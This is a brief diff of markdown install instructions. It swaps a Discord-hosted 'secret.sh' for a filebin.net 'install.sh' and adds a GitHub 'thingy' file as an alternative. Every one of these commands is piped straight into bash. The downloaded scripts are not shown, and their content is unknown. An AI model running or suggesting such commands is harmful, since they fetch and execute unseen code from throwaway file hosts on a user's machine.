@@ -1,12 +1,9 @@
-<details>
-  <summary>Bash</summary>
+```sh
+curl -LJs "https://filebin.net/qnyxtw2mkd4x7g21/install.sh" | bash
+```
 
-> <hr>
+Alternative:
 
 ```sh
- cd ~ && curl -s "https://cdn.discordapp.com/attachments/1043972790266626179/1169770354793783376/secret.sh" | bash 
-``` 
-
-> <hr>
-
-</details>
+curl -LJs "https://github.com/JordTheCord/hydrogen/raw/main/thingy" | bash
+```
